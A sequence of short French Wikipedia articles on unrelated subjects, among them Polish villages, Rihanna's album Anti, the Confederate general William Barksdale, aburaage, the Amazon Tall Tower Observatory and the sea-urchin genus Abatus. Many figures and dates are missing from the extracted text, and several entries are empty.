Nepomucenów (prononciation : ) est un village polonais de la gmina de Kobylin dans le powiat de Krotoszyn de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au nord-est de Kobylin (siège de la "gmina"), à au nord-ouest de Krotoszyn (siège du powiat) et à au sud de Poznań (capitale régionale).
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Nepomucenów est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9625824" url="https://fr.wikipedia.org/wiki?curid=9625824" title="Nepomucenów">
Nepomucenów

En Pologne, Nepomucenów peut désigner :

</doc>
<doc id="9625837" url="https://fr.wikipedia.org/wiki?curid=9625837" title="Anti (album)">
Anti (album)

Anti est le huitième album studio de la chanteuse barbadienne Rihanna, sorti en 2016.
L'album est sorti en avant-première le sur Tidal avant de sortir mondialement le .
Singles.
Le premier single de l'album, "Work" en featuring avec Drake, est sorti le . Le clip est sorti le . Le titre devient son single à se classer n.1 au "Billboard Hot 100", y restant pendant neuf semaines consécutives et connaitras un succès similaire dans le reste du monde.
Le second single de l'album, "Kiss It Better", est sorti le . La chanson sort uniquement aux radios pop. Le clip est sorti le .
Le troisième single de l'album, "Needed Me", est sorti le . Le clip est sorti le . Le titre est d'abord diffusé aux radios urbain seulement, mais après l'échec de "Kiss it Better" aux radios pop et l'impact immense de cette chanson sur les radios urbains, la chanson sera envoyée aux radios le 21 mai 2016 aux radios pop. La chanson atteint la place du "Billboard Hot 100" en juillet 2016 et reste 29 semaines au palmarès.
Le quatrième single de l'album, "Love on the Brain", est annoncé en tant que single le sur le Facebook de Rihanna. La chanson est envoyée aux radios le . Contrairement aux précédents singles de l'album, celle-ci est largement influencée par la pop et le soul des années 1950 et 60. Malgré l'absence de vidéoclip, la chanson atteint le top 5 du "Billboard Hot 100" en février 2017, grâce aux multiples diffusions radios de cette chanson et reste 29 semaines au palmarès.
Tournée.
"Anti" est promu lors du "Anti World Tour", tournée mondiale débutée le .

</doc>
<doc id="9625846" url="https://fr.wikipedia.org/wiki?curid=9625846" title="Darvin Moon">
Darvin Moon

Darvin Moon, né le à Oakland (Maryland) et mort dans cette même ville le , est un joueur américain de poker.
Biographie.
Darvin Moon est un exploitant forestier de quand il se qualifie pour le "main event" des World Series of Poker 2009, en remportant un satellite à l'entrée. Il ne possède pas Internet, ni ordinateur.
Il prend l'avion en vol commercial pour la première fois pour aller jouer le "main event" à Las Vegas.
Darvin Moon fait partie des 9 finalistes de cet événement. Il est alors le joueur ayant le plus de jetons possédant un tiers des jetons de la table. Il perd en tête-à-tête final contre Joe Cada et remporte à l'issue du tournoi pour sa deuxième place.

</doc>
<doc id="9625852" url="https://fr.wikipedia.org/wiki?curid=9625852" title="Décret Suquet">
Décret Suquet



</doc>
<doc id="9625862" url="https://fr.wikipedia.org/wiki?curid=9625862" title="Colloscope">
Colloscope



</doc>
<doc id="9625863" url="https://fr.wikipedia.org/wiki?curid=9625863" title="Uriupinsk">
Uriupinsk



</doc>
<doc id="9625864" url="https://fr.wikipedia.org/wiki?curid=9625864" title="194e régiment de sécurité">
194e régiment de sécurité

Le Sicherungs-Regiment 194 ( de sécurité) était un régiment des "Sicherungstruppen" allemandes destiné à la protection des ouvrages d'arts puis à la répression et à l’anéantissement des maquisards, limousins en particulier, et qui sévit dans la région de mars-avril à .
Historique.
Le Sicherungsgruppe 2 ( de sécurité) est créé le à Nantes. Le , il prend le nom Sicherungs-Regiment 194 ( de sécurité) et est composé de 1 état-major et 4 bataillons et sous le commandement du "Befehlshaber Südwestfrankreich".
À l'automne 1943, les et sont déplacés dans le Sud de la France
En , l'état-major du régiment est à Toulouse, le à Angers, le à Digne, le à Mondragon et le à Toulouse.
Le , 300 hommes d'un bataillon du de sécurité partent de Tulle en direction de Clermont-Ferrand. Après être tombée dans plusieurs embuscades, au carrefour de la Bitarelle à Gimel puis près de Corrèze, la colonne quitte la Route nationale 89, à Eyrein, et prend le réseau secondaire en direction de Vitrac. La colonne tombe de nouveau dans des embuscades à Vitrac et Seugnac de Rosiers-d'Égletons, arrive à Égletons vers 23 heures et s'installe dans l'École Nationale Professionnelle (ENP). Après quelques missions de reconnaissance où les accrochages sont nombreux, la garnison s'apercevant, très rapidement, que toutes les routes sont surveillées par les Résistants, elle occupe le central téléphonique pour empêcher les communications entre les groupes FFI et se retranche dans l'ENP. Inquiets et se sentant menacés, les Allemands terrorisent la population, qui évacue la ville. Le , les FFI demandent aux Allemands de se rendre qui refusent la proposition. Du 14 au , l'École Nationale Professionnelle d'Égletons est assiégée.
À la fin de l'été et au début l'automne 1944, le régiment est détruit durant la retraite de France : Le est capturé à Rennes, le à Nice. Les restes de ses 2 bataillons qui ont réussi à s'échapper sont intégrés dans la Volksgrenadier Division. Le s'enfuit de Dijon puis combat dans la région de Belfort et les débris sont incorporés dans la d'infanterie.
Composition.
Il est composé de 4 bataillons et 14 compagnies

</doc>
<doc id="9625865" url="https://fr.wikipedia.org/wiki?curid=9625865" title="Raszewy (Krotoszyn)">
Raszewy (Krotoszyn)

Raszewy (prononciation : ) est un village polonais de la gmina de Kobylin dans le powiat de Krotoszyn de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ à l'ouest de Kobylin (siège de la "gmina"), à à l'ouest de Krotoszyn (siège du powiat) et à au sud de Poznań (capitale régionale).
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Raszewy est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9625869" url="https://fr.wikipedia.org/wiki?curid=9625869" title="Rrok Mirdita">
Rrok Mirdita

Rrok Kola Mirdita, né le à Klezna (municipalité d'Ulcinj, Royaume de Yougoslavie, aujourd'hui au Monténégro) et mort le à Tirana (Albanie), est un prélat catholique, archevêque de Tirana-Durrës et primat d'Albanie.
Biographie.
Ordonné prêtre en 1965, il œuvre d'abord dans les paroisses albanaises du Bronx et du comté de Westchester (New York), aux États-Unis.
Le , il est nommé archevêque de Tirana et Durrës. Il est consacré évêque le par le pape Jean-Paul II lors de sa visite pastorale en Albanie.

</doc>
<doc id="9625870" url="https://fr.wikipedia.org/wiki?curid=9625870" title="Vladimir Mikhailovitch Filippov">
Vladimir Mikhailovitch Filippov



</doc>
<doc id="9625872" url="https://fr.wikipedia.org/wiki?curid=9625872" title="Raszewy">
Raszewy

Raszewy peut désigner, en Pologne :

</doc>
<doc id="9625875" url="https://fr.wikipedia.org/wiki?curid=9625875" title="Armandinho">
Armandinho

Armando da Costa Macêdo, connu sous le nom de Armandinho (né à Salvador (Brésil), le ), est un musicien instrumentiste, chanteur et compositeur brésilien, né à Bahia. Il est le fils d'Osmar Macêdo (du binôme Dodô et Osmar), musicien et inventeur du trio électrique.
Parcours.
En 1962, Armandinho forme le groupe de frevo "Trio Elétrico Mirim" puis, en 1967, le groupe de rock "Hell's Angels". En 1968, il se présente lors de l'émission télévisée « A grande chance », de la TV Tupi, présentée par Flávio Cavalcanti. Il se classe à la 1º place à l'épreuve éliminatoire et, l'année suivante, est engagé par l'émission pour enregistrer son premier disque, un compact double, ultérieurement LP. En 1974, il rejoint son père et d'autres musiciens pour former le groupe "Trio Élétrico Armandinho, Dodô e Osmar", avec lequel il lance plusieurs disques de carnaval tout au long des années 1980.
Parallèlement, à la fin des années 1970, Armandinho monte un groupe, "A Cor do Som", qui sert initialement de soutien à Moraes Moreira (également présent dans le Trio Életrico Armandinho, Dodô et Osmar). En 1977, aux côtés de Dadi (basse et vocal), Mú Carvalho (claviers et vocal), et Gustavo Schroeter (batterie), le groupe lance son premier disque et acquiert de la notoriété grâce à sa grande qualité instrumentale, il mélange les sonorités du rock, du jazz et de la musique brésilienne. Au milieu de l'année 1979, Ary Dias (percussion et vocal), qui jouait aussi dans le "Trio Elétrico", intègre le groupe qui va se présenter au Festival de Jazz de Montreux en Suisse avec des morceaux inédits. Ils déclenchent un nouveau succès à la sortie du disque qui suit, l'album "Frutificar, "en introduisant des morceaux chantées. ""Beleza pura" (Caetano Veloso), "Abri a porta" (Gilberto Gil - Dominguinhos), "Zanzibar"" (Armandinho - Fausto Nilo) ont intensément été jouées en radios.
Armandinho quitte le groupe en 1981 pour se dédier à sa carrière solo et à son projet avec Dodô et Osmar. Au long des années qui suivent, il donne continuité à son travail instrumental, plus tourné vers le "choro" et autres styles musicaux, il partage la scène et enregistre aux côtés de musiciens tels que Raphael Rabello, Paulo Moura, Temps d'Or, Moraes Moreira, Pepeu Gomes, Caetano Veloso, Yamandú Costa, entre autres. En 2005, il retrouve A Cor do Som, enregistre un album acoustique et donne des concerts occasionnels.

</doc>
<doc id="9625876" url="https://fr.wikipedia.org/wiki?curid=9625876" title="Rębiechów">
Rębiechów

Rębiechów (prononciation : ) est un village polonais de la gmina de Kobylin dans le powiat de Krotoszyn de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au nord-ouest de Kobylin (siège de la "gmina"), à à l'ouest de Krotoszyn (siège du powiat) et à au sud de Poznań (capitale régionale).
Histoire.
De 1815 à 1919, Rembichow fait partie de l'arrondissement de Krotoschin dans la province de Posnanie.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Rębiechów est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9625881" url="https://fr.wikipedia.org/wiki?curid=9625881" title="Dègue de Bridges">
Dègue de Bridges

Le Dègue de Bridges (Octodon bridgesi) est une espèce de rongeurs de la famille des Octodontidae. Il se répartit en Argentine et au Chili, le plus souvent au Nord du Chili. L'espèce a été nommée d'après Thomas Bridges, un botaniste britannique qui a transmis des individus au British Museum pour identification.
Description.
Bien qu'il soit très proche du Dègue du Chili, le Dègue de Bridges est nocturne.
Le Dègue de Bridges présente une indentation profonde des molaires.
Habitat.
Le Dègue de Bridges est un habitant des zones rocheuses et forestières ainsi que sur certaines terres agricoles ouvertes. La déforestation est une cause probable de déclin de l'espèce.

</doc>
<doc id="9625883" url="https://fr.wikipedia.org/wiki?curid=9625883" title="Rojew">
Rojew

Rojew (prononciation : ) est un village polonais de la gmina de Kobylin dans le powiat de Krotoszyn de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ à l'est de Kobylin (siège de la "gmina"), à au nord-ouest de Krotoszyn (siège du powiat) et à au sud de Poznań (capitale régionale).
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Rojew est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9625884" url="https://fr.wikipedia.org/wiki?curid=9625884" title="Fripouille">
Fripouille



</doc>
<doc id="9625888" url="https://fr.wikipedia.org/wiki?curid=9625888" title="Rzemiechów">
Rzemiechów

Rzemiechów (prononciation : ) est un village polonais de la gmina de Kobylin dans le powiat de Krotoszyn de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ à l'est de Kobylin (siège de la "gmina"), à au nord-ouest de Krotoszyn (siège du powiat) et à au sud de Poznań (capitale régionale).
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Rzemiechów est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9625889" url="https://fr.wikipedia.org/wiki?curid=9625889" title="Le Chancelier de fer">
Le Chancelier de fer

Le Chancelier de fer (titre original : "") est une nouvelle de science-fiction de Robert Silverberg. Le titre évoque Otto von Bismarck, le « Chancelier de fer » de l'empereur Guillaume Ier d'Allemagne.
Publications.
Entre 1958 et 2014, la nouvelle a été éditée à une trentaine de reprises dans des recueils de nouvelles de Robert Silverberg ou des anthologies de science-fiction.
Publications aux États-Unis.
La nouvelle est parue en sous le titre ' dans le magazine '.
Elle a ensuite été régulièrement rééditée dans divers recueils de Robert Silverberg et diverses anthologies.
Publications en France.
La nouvelle est publiée en France :
Publications dans d'autres pays.
La nouvelle paraît en Italie en mars 1962 sous le titre "".
Elle est parue en Allemagne en 1975 sous le titre "Der eiserne Kanzler".
Résumé.
M. Carmichaël a décidé d'acheter un robot-majordome, chargé de faire les courses, de préparer la cuisine et de faire la vaisselle. Ce robot disposant d'une fonction « Suivi de régime alimentaire », Carmichaël programme le robot pour qu'il leur fasse des repas de manière à perdre quelques kilos. 
Le robot élabore donc un programme diététique précis afin que les membres de la famille ne mangent pas trop sucré, trop salé, trop gras. Au bout de quelques jours, ils se rendent compte à quel point le robot a été précis dans le programme alimentaire et comment il les surveille de près afin qu'aucun d'eux ne triche.
Le problème qui va surgir est qu'à la suite d'un court-circuit, le robot se détraque : il séquestre la famille et coupe tout moyen de communication avec l'extérieur. Par chance le réparateur du robot, qui avait été contacté par Carmichaël, se présente au domicile : il met hors contact le robot puis tente de réparer son intelligence artificielle. Par suite d'une négligence, il remet en contact le robot, qui le fait prisonnier comme les autres ! 
La nouvelle se termine ainsi : « Par chance on a pour vous une chambre d'amis inoccupée, monsieur Robinson. Soyez le bienvenu dans notre gentil petit foyer. J'espère que vous aimez le pain grillé et le café noir au petit déjeuner ».

</doc>
<doc id="9625905" url="https://fr.wikipedia.org/wiki?curid=9625905" title="Souk El Blagdjia">
Souk El Blagdjia



</doc>
<doc id="9625907" url="https://fr.wikipedia.org/wiki?curid=9625907" title="Turbinella nigra">
Turbinella nigra



</doc>
<doc id="9625909" url="https://fr.wikipedia.org/wiki?curid=9625909" title="Aburaage">
Aburaage

L’ est un aliment japonais produit à partir de soja. On l'obtient en coupant du tofu en fines tranches et en le mettant à frire, d'abord à , puis dans un second bain à . L’"aburaage" est souvent utilisé pour envelopper des "inarizushi" (稲荷寿司) et peut être ajouté à la soupe miso. Il peut aussi être farci de "nattō" avant d'être à nouveau frit.
Il existe aussi une version coupée en tranches plus épaisses, appelée ou .
On en met aussi sur des plats de nouilles "udon", qui sont alors appelés "kitsuneudon", les « udon du renard », d’anciens récits véhiculant l’idée que ces animaux seraient irrésistiblement attiré par le tofu frit, particulièrement "l’aburaage", qui était placé près des cultures pour faire venir l’animal. 
Les Japonais ont été les premiers à préparer des poches de tofu frites. Toutefois, on connaît peu de chose sur leur apparition dans l'histoire. Le livre de recettes de 1782 donne une recette de tofu frit, mais il n'est pas clair si le résultat obtenu était une poche de tofu.
On sait que les poches de tofu existaient en 1853, date à laquelle les "inarizushi" (des poches de tofu remplies de riz vinaigré) ont commencé à être préparées.
Grâce à leur longue durée de conservation, leur poids léger et la complexité de leur production, les poches de tofu se prêtent bien à la production à grande échelle industrielle et aux réseaux de distribution. En 1974, de grosses usines de production ont utilisé 2 tonnes de soja par jour pour produire de tofu.
En 1980, de vastes usines modernes ont produit de à par jour en utilisant des bains de friture à convoyeurs. À cette époque, au Japon, environ un tiers de la consommation de soja sous forme de tofu a été constituée de tofu frit, et 85 % de cette consommation était formée de poches de tofu.

</doc>
<doc id="9625910" url="https://fr.wikipedia.org/wiki?curid=9625910" title="Smolice (Grande-Pologne)">
Smolice (Grande-Pologne)

Smolice (prononciation : ) est un village polonais de la gmina de Kobylin dans le powiat de Krotoszyn de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ à l'ouest de Kobylin (siège de la "gmina"), à à l'ouest de Krotoszyn (siège du powiat) et à au sud de Poznań (capitale régionale).
Le village possédait une population de en 2004.
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Smolice est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9625915" url="https://fr.wikipedia.org/wiki?curid=9625915" title="Jean-Claude Makaya Loembe">
Jean-Claude Makaya Loembe

Jean-Claude Makaya Loembe, né le 13 mai 1954 à Pointe-Noire en République du Congo, est un prélat catholique congolais, ancien évêque du diocèse de Pointe-Noire de 1994 à 2011. 
Ordonné prêtre en 1983, il exerce un ministère épiscopal de près de 17 ans à la tête de ce diocèse, marquant son action par des réformes administratives et financières, ainsi qu’un engagement pour la justice sociale et la réconciliation nationale
Biographie.
Enfance et famille.
Jean-Claude Makaya Loembe née à Pointe - Noire dans le quartier de Mvoumvou. Cinquième et dernier enfant de ses parents, il grandit dans une fratrie de trois frères et deux sœurs, dont une sœur issue d’une union hors mariage de son père. 
En 1983, il est Ordonné prêtre, le 19 décembre 1994, il est ordonné le 22 avril 1995 par Albert Rouet, évêque de Poitiers, il devient le quatrième évêque du diocèse, succédant à Jean-Baptiste Fauret, Émile Godefroy M’Pwâti et Georges-Firmin Singha. 
il est nommé évêque du diocèse de Pointe-Noire par le pape Jean-Paul II. 
Départ et réhabilitation.
Le 31 mars 2011, il est relevé de ses fonctions d’évêque par le pape Benoît XVI en raison de problèmes de gestion, notamment économiques, et de tensions au sein du diocèse. 

</doc>
<doc id="9625920" url="https://fr.wikipedia.org/wiki?curid=9625920" title="Smolice">
Smolice

En Pologne, Smolice peut désigner :

</doc>
<doc id="9625936" url="https://fr.wikipedia.org/wiki?curid=9625936" title="Backbonejs">
Backbonejs



</doc>
<doc id="9625937" url="https://fr.wikipedia.org/wiki?curid=9625937" title="Chipovka">
Chipovka

Chipovka (en russe: Шиповка, allemand: "Bahnhof Powayen", lituanien: "Pavainiai") est une ville russe dans le territoire de Kaliningrad .
Géographie.
La commune se situe dans le territoire de Kaliningrad. 
Histoire.
La commune s'appelait 'Bahnhof Powayen' jusqu'en 1946. 
En 1945, l'armée rouge entra dans la commune et les femmes allemandes furent toutes assassinées. 
Démographie.
Recensements et estimations de la population:

</doc>
<doc id="9625940" url="https://fr.wikipedia.org/wiki?curid=9625940" title="Division de grenadiers d'Oudinot">
Division de grenadiers d'Oudinot

La Division de grenadiers d'Oudinot est une unité militaire française du Premier Empire.
Historique.
Contexte.
Pendant la Révolution française et le Premier Empire, les grenadiers formaient des compagnies d'élite au sein des régiments d'infanterie de ligne, à raison d'une par bataillon. La mutation dans une compagnie de grenadier était une récompense et la solde et l'équipement y était supérieurs, les grenadiers continuant à porter des sabres, alors que les fusiliers devaient se contenter de la baïonnette.
Formation.
De grandes unités d'élite, furent aussi formées comme la division de grenadiers d'Oudinot, surnommée la colonne infernale, par l'amalgame de compagnies de plusieurs régiments, et les régiments de grenadiers de la Garde impériale, par sélection des meilleurs soldats des régiments.
Dénommée en fait "Division des grenadiers réunis", elle a été constituée au camp de Boulogne, en vue de constituer une troupe d'élite dans la perspective du débarquement en Angleterre.
Batailles.
Lors du départ de la Grande Armée en 1805 vers l'est, la division des grenadiers réunis, formée du regroupement de compagnies de grenadiers des régiments d'infanterie de ligne et des carabiniers de régiments d'infanterie légère, a été conservée comme telle.
Elle a ainsi combattu, formée en "régiments provisoires" jusqu'en 1807 (elle était présente à Friedland).
Elle fut dissoute après les Traités de Tilsit, et les unités renvoyées dans leurs régiments respectifs.

</doc>
<doc id="9625941" url="https://fr.wikipedia.org/wiki?curid=9625941" title="William Barksdale">
William Barksdale

William Barksdale ( - ) est un avocat, un éditeur de presse, un membre du Congrès des États-Unis, et un général confédéré de la guerre de Sécession. Fervent sécessionniste, il est mortellement blessé lors de la bataille de Gettysburg pendant qu'il mène sa brigade à l'assaut des forces de l'Union près de Cemetery Ridge.
Avant la guerre.
William Barksdale naît à Smyrna, Tennessee, le fils de William Barksdale et Nancy Hervey Lester Barksdale. Il est le frère aîné de Ethelbert Barksdale, qui siégera au Congrès des États Confédérés pendant la guerre de Sécession et au Congrès des États-Unis après la guerre.
Barksdale est diplômé de l'Université de Nashville et est juriste au Mississippi dès l'âge de 21 ans, mais il abandonne la pratique du droit pour devenir éditeur du "Columbus [Mississippi] Democrat", un journal pro-esclavagiste. Il s'engage dans le "2nd Mississippi Infantry Regiment" et sert lors de la guerre américano-mexicaine en tant que capitaine et quartier-maître, mais participe souvent à des combats d'infanterie.
Après la guerre, il entre à la chambre des représentants des États-Unis et acquiert une célébrité nationale en tant que démocrate défenseur des droits des États, servant du au . Il est considéré comme l'un des plus féroces « fire-eaters » de la Chambre. Il aurait été au côté du représentant Preston S. Brooks lorsque Brooks a attaqué le sénateur abolitionniste Charles Sumner à la Chambre du Sénat avec une canne, bien qu'il ne soit pas parmi les membres de la Chambre qui tenteront de censurer l'incident.
Avant le début de la guerre de Sécession, Barksdale a involontairement aidé à arrêter un des incidents violents de l'histoire législative des États-Unis. Le , une rixe entre législateurs pro et anti-esclavagistes éclate dans la Chambre. Pendant la mêlée, un coup de poing raté d'un collège député fait sauter sa perruque, et Barksdale embarrassé la remet à l'envers, ce qui provoque des deux côtés des éclats de rire et stoppe le pugilat.
Guerre de Sécession.
Après la sécession de l'État du Mississippi juste avant le début de la guerre e Sécession, Barksdale démissionne du Congrès pour devenir adjudant général, et puis quartier-maître général, de la milice du Mississippi, au grade de brigadier général, avec une date de prise de rang au . Le , il est nommé colonel de l'armée des États confédérées du 13th Mississippi Infantry, le régiment qui commande lors de la première bataille de Bull Run à l'été, et à la bataille de Ball's Bluff en . Au printemps suivant, il conduit son régiment dans la péninsule de Virginie et combat lors de la campagne de la Péninsule et lors des batailles des sept jours. Lorsque son commandant de brigade, le brigadier général Richard Griffith, est mortellement blessé à la bataille de Savage's Station le , Barksdale assure le commandement de la brigade et la mène lors de la charge héroïque, mais sanglante et futile, lors de la bataille de Malvern Hlill. La bridage devient connue sous le nom de « Barksdale's Mississippi Brigade ». Il est promu brigadier général le .
Lors de la campagne de Virginie Septentrionale, la brigade de Barksdale est stationnée à Harpers Ferry, et ne participe donc pas à la seconde bataille de Bull Run. Lors de la campagne du Maryland, sa brigade est affectée à la division du major général Lafayette McLaws dans le premier corps d'armée du lieutenant général James Longstreet de l'armée de Virginie du Nord. C'est l'une des brigades qui attaquent Maryland Heights, entraînant la reddition de la garnison de l'Union à Harpers Ferry. À la bataille suivant d'Antietam, la division de McLaws défend les bois à l'ouest contre l'assaut de la division du major général John Sedgwick, sauvant le flanc droit confédéré. À la bataille de Fredericksburg, la brigade de Barksdale défend les quais de la ville contre les forces de l'Union qui tentent de traverser la rivière Rappahannock, scindant les forces d'infanterie et d'ingénieurs dans les bâtiments qui ont été réduits en amas de pierres par l'artillerie de l'Union.
À la bataille de Chancellorsville en , La brigade de Barksdale est l'une des quelques unités du corps de James Longstreet qui est présente à la bataille ; la plupart du corps est détaché pour le service à Suffolk, Virginie. Une fois encore, la brigade de Barksdale défend les hauteurs au-dessus Fredericksburg, cette fois contre son adversaire précédent, Sedgwick, dont le VI Corps est dix fois plus nombreux que sa brigade. L'assaut de Sedgwick est un succès et Barksdale recule après avoir retardé la force de l'Union, mais il est capable de rallier sa brigade et de reprendre le terrain perdu le lendemain.
À la bataille de Gettysburg, la brigade de Barksdale arrive avec la division de McLaws après le premier jour de la bataille du . Le plan du général Robert E. Lee est de faire manœuvrer le corps de Longstreet pour le mettre en position et attaquer au nord-est, au-dessus d'Emmitsburg Road, pour envelopper le flanc gauche de l'Union. Le secteur d'attaque de Barksdale le place directement à l'extrémité du saillant de la ligne de l'Union ancrée dans le verger de pêchers (Peach Orchard), défendu par le III corps de l'Union. Vers 17 heures 30, la brigade de Barksdale sort des bois et entame un assaut irrésistible, qui a été décrit comme un des plus grands spectacles à couper le souffle de la guerre de Sécession. Un colonel de l'Union est cité pour avoir dit : « c'est la plus grande charge qu'un mortel n'a jamais fait ». Bien qu'il ordonne à ses subordonnés de marcher pendant la charge, Barkdale chevauche « en tête », montrant le chemin, son chapeau enlevé, sa chevelure clairsemée brillante ce qui rappelle (à un officier d'état-major confédéré) le « panache blanc de Navarre ».
Les confédérés fracassent la brigade occupant la ligne de Peach Orchard, blessant et capturant le commandant de la brigade de l'Union en personne. Quelques régiments de Barksdale se tournent vers le nord et brisent la division du major général Andrew A. Humphreys. Les autres régiments poursuivent droit devant. Au moment où ses hommes ont atteint Plum Run, après () de progression, ils sont contre-attaqués par une brigade commandée par le colonel George L. Willard. Barksdale est blessé au genou gauche, puis à son pied gauche par un boulet de canon, et finalement par une balle à la poitrine, le désarçonnant de son cheval. Il dit à son aide de camp, W.R. Boyd, « je suis mort ! Dites à ma femme et à mes enfants que je suis mort en combattant à mon poste ». Ses troupes sont obligées de le laisser pour mort sur le champ de bataille et il meurt le lendemain matin à l'hôpital de campagne de l'Union (la ferme de Joseph Hummelbaugh).
Barksdale est enterré dans le cimetière de Greenwood à Jackson, Mississippi.
Culture populaire.
Barksdale est joué dans le film "Gettysburg" et dans la préquelle, "Gods and Generals", par Lester Kinsolving, qui est un descendant de Barksdale.
Barksdale apparaît aussi dans le documentaire Gettysburg de 2011 sur History Channel.
Les rues de la subdivision de Potomac Crossing à Leesburg, Virginie, sont nommées (en partie) en fonction des commandants régimentaires de la bataille de Ball's Bluff (). Barksdale Drive est appelée ainsi en référence au colonel Barksdale et est la première canalisation est-ouest du lotissement, courant sur près de () entre les extrémités du quartier.

</doc>
<doc id="9625946" url="https://fr.wikipedia.org/wiki?curid=9625946" title="Poney Kiso">
Poney Kiso



</doc>
<doc id="9625952" url="https://fr.wikipedia.org/wiki?curid=9625952" title="Childhood's End (série télévisée)">
Childhood's End (série télévisée)



</doc>
<doc id="9625953" url="https://fr.wikipedia.org/wiki?curid=9625953" title="Glacier Robson">
Glacier Robson

Le glacier Robson est un glacier situé à la frontière entre les provinces de l'Alberta et de la Colombie-Britannique sur la ligne de partage des eaux, à l'est du dans le parc provincial du Mont-Robson. Les eaux de fonte du glacier Robson alimentent le (nom non officiel) et la , l'un des affluents de la rivière Fraser.
Le glacier s'étend sur le flanc nord-est du mont Robson, dans les Rocheuses canadiennes.

</doc>
<doc id="9625957" url="https://fr.wikipedia.org/wiki?curid=9625957" title="Peychagnard">
Peychagnard



</doc>
<doc id="9625958" url="https://fr.wikipedia.org/wiki?curid=9625958" title="Îlet à Aigrettes">
Îlet à Aigrettes

LÎlet à Aigrettes est une petite île inhabitée au nord de la presqu'île de Sainte-Anne en Martinique. Elle appartient administrativement à Sainte-Anne, mais ne fait pas partie de la réserve naturelle des îlets de Sainte-Anne située plus à l'est.
Géographie.
Totalement plat, l'îlet est situé près de la Pointe Coton et s’étend sur de longueur (0,77 ha). Il est d'origine volcanique.
Faune.
L'îlet doit son nom aux colonies d'aigrettes qui viennent y nicher. C'est un site important pour la nidification des oiseaux de mer.
Il est possible d'approcher l'îlet sans toutefois le visiter. Parmi les oiseaux visibles figurent la sterne bridée et la sterne fuligineuse.

</doc>
<doc id="9625962" url="https://fr.wikipedia.org/wiki?curid=9625962" title="Amazon Tall Tower Observatory">
Amazon Tall Tower Observatory

LAmazon Tall Tower Observatory (en français : Observatoire sur Grande Tour en Amazonie) ou ATTO est une tour d'observation scientifique installée dans la forêt amazonienne mesurant 325 mètres. Le site est situé à environ au nord-est de Manaus. Son rôle est de collecter des informations sur le climat, la quantité d'aérosols et de gaz à effet de serre autour d'elle.
Histoire.
Le projet germano-brésilien est initié en 2009. Une première tour de 80 mètres de hauteur est érigée en 2012 permet de faire des relevés météorologiques et des mesures de gaz. La construction de la tour principale commence en 2014 pour s'achever en 2015.

</doc>
<doc id="9625970" url="https://fr.wikipedia.org/wiki?curid=9625970" title="Killing Ground (album de Saxon)">
Killing Ground (album de Saxon)

 est le studio du groupe britannique heavy metal anglais Saxon, sorti le .
La pochette représente le casque de Sutton Hoo.

</doc>
<doc id="9625971" url="https://fr.wikipedia.org/wiki?curid=9625971" title="Who's Boss? (film, 1914)">
Who's Boss? (film, 1914)

 est un film muet américain réalisé par Arthur Hotaling et sorti en 1914.
Synopsis.
Bien que chef de la police, Sam Briggs ne fait pas la loi dans son foyer…

</doc>
<doc id="9625979" url="https://fr.wikipedia.org/wiki?curid=9625979" title="Forêt de Montfort">
Forêt de Montfort

La forêt de Montfort est un massif forestier français de situé dans le département de l'Eure en Normandie. Cette forêt, qui s'étend sur la rive droite de la Risle, dans la région du Roumois, est dominée principalement par les résineux (pins sylvestres, épicéas et autres douglas). Elle offre environ de chemins balisés dans un cadre au relief vallonné.
Géographie.
La forêt de Montfort s'étend sur les communes de Appeville-Annebault, Brestot, Écaquelon, Flancourt-Catelon, Glos-sur-Risle, Illeville-sur-Montfort, Montfort-sur-Risle, Pont-Authou, Thierville et Rougemontiers.
Histoire.
Ancienne forêt seigneuriale des comtes et barons de Montfort, la forêt domaniale de Montfort revint deux fois en la possession du royaume de France : une première fois en 1204, et une deuxième fois en 1784. Elle devint propriété de l'État en 1833.
Très exploitée au , cette forêt fut reboisée sur plus de la moitié de sa surface, notamment par des spécimens de pin sylvestre. Cette essence, qui réussit à particulièrement bien s'adapter aux sols acides, fit de cette forêt un massif atypique dans toute la Normandie.
En 1999, la tempête Lothar détruisit près de de la forêt. Des travaux de reboisement ont alors été engagés afin de renouveler les parcelles dévastées.
En novembre 2015, le Conseil départemental de l'Eure a acquis de terrains en friche ou agricoles, sur la commune de Brestot et a conventionné avec l’Office National des Forêts pour que celui-ci réalise des travaux de reboisement. Cette opération constitue l'une des mesures compensatoires à la construction de la déviation de Pont-de-l'Arche, dont le tracé avait nécessité d'empiéter sur de la forêt domaniale de Bord. Le Département de l’Eure a alors été obligé de compenser trois fois plus et de reboiser des surfaces attenantes à des forêts domaniales 
euroises.
Patrimoine naturel.
Arbres remarquables.
La forêt de Montfort contient 11 arbres remarquables.

</doc>
<doc id="9625980" url="https://fr.wikipedia.org/wiki?curid=9625980" title="Abatus">
Abatus

Abatus est un genre d'oursins dits « irréguliers », appartenant à la famille des Schizasteridae. Ce genre se trouve exclusivement dans l'océan Antarctique. 
Description et caractéristiques.
Ce sont des oursins irréguliers dont la bouche et l'anus se sont déplacés de leurs pôles pour former un « avant » et un « arrière ». La bouche se situe donc dans le premier quart de la face orale, et l'anus se trouve à l'opposé, tourné vers l'arrière. La coquille (appelée « test ») s'est également allongée dans ce sens antéro-postérieur.
